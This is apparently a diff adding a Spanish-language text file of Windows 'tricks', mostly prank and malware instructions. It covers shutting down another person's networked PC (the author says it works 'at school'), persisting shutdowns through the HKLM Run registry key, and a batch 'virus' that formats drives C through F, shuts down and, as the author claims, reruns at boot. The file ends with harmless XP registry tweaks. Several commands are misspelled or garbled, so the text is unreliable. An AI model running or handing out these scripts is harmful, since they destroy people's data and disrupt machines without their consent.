@@ -1,0 +1,71 @@
+para enviar un shutdown por la red a una direccion ip solo has lo siguiente.
+
+primero veremos que direccion de ip tiene con un scaner de ip
+despues abrimos MS-DOS
+ESCRIBIMOS PING para ver si tenemos comunicacion
+despues de que tengamos escribimos nststat -a 111.111.111.111
+donde 111.111.111.111 es la direccion ip
+veremos si tiene IA compartidos, donde salga <20> es que si..
+vemos el nombre de la compu ejemplo: juan
+escribimos
+shutdown.exe -s -m juan -t (tiempo en segundos) -f -c "mensaje"
+a veces me funciona, en la escuela.
+Para cancelar estos molestos cuadros solo basta con escribir shutdown.exe -a en ejecutar y se cancela rapidamente.
+
+
+Esto hace qu el pc se reinicie a los 30 segundos
+
+shutdown -s-t 30-c "este virus mira k es sencillo pero te esta jodiendo"
+
+para que arranque con windows colocarlo en:  HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+
+codigo simple para apagar el pc
+@echo off
+
+title Hack AjR
+color 0a
+set/p edad= ¿Deseas Ejecutar El Virus?
+pause > nul
+cls
+if %edad%==Si goto apagar
+if %edad%==No goto apagar
+:apagar
+start shutdown -s -f
+exit 
+
+escribe:
+@echo off(esto es para q se ejecute de manera automatica)
+msg * hola,bla bla bla (escribes lo que kieras)
+format C:
+format F:
+format E:
+format D:
+msg * todo se acabo
+shoutdown -s -t 00 -f "amigo estas perdido"
+Shat\/mblockdenotas/autoreiniciar/simbol/msntaskill***/
+exit
+
+y listo eso es todo
+lo que hace es que se autoejecute, de un mensaje, formatee todas las unidades y luego apague   el pc y cuando lo vuelva a prender, se activará de nuevo el virus
+
+Haz clic con el ratón derecho en una zona libre del Escritorio y luego selecciona Nuevo y Acceso directo.
+En la ventana del acceso directo debes escribir shutdown -s -t 00 y pulsa el botón Siguiente, después le pones el nombre que quieras al acceso directo y pinchas el botón Finalizar.
+Si quieres dejar algo de tiempo para cerrar las aplicaciones debes poner esto shutdown.exe -s -t 12 de esta forma dejarás un margen prudencial de 12 segundos para apagar el PC.
+
+Aca dejo mas "trucos interesantes"
+
+Mientras estás utilizando Windows XP, el sistema te va mostrando distintas ventanas de aviso en la parte inferior junto al Reloj, estas ventanas que a veces son molestas se pueden eliminar de la siguiente forma:
+Haces clic en el botón Inicio y luego en Ejecutar, una vez te muestre el cuadro ejecutar escribe la palabra Regedit y pulsa el botón Aceptar
+Cuando aparezca el Editor del Registro "Regedit" desplázate por la siguiente cadena HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Explorer/Advanced
+Pulsa sobre la opción Edición de la barra de herramientas y luego Nuevo, y Valor DWORD con ello aparecerá una nueva ventana.
+Escribe EnableBalloonTips y pulsa la tecla Intro.
+Reinicia Windows y no volverás a ver esas ventanitas tan molestas algunas veces.
+
+inmovilizar los iconos del Escritorio
+Windows XP también se pueden inmovilizar los iconos del Escritorio, recurriendo al registro de Windows. Para realizar este truco haremos lo siguiente:
+Abrimos el Registro de Windows y nos desplazamos por la siguiente rama:
+HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Polices/Explorer
+Una vez tenemos seleccionada la carpeta Explorer y en el panel derecho hacemos clic con el ratón derecho para crear una entrada nueva.
+Hacemos clic en Nuevo y luego en DWORD, ahora le damos el siguiente nombre NoSaveSettings.
+Luego hacemos doble clic sobre la nueva entrada y le damos el valor 1 y pulsamos el botón Aceptar.
+Finalmente cerramos todas las ventanas que tengamos abiertas y reiniciamos el ordenador. 
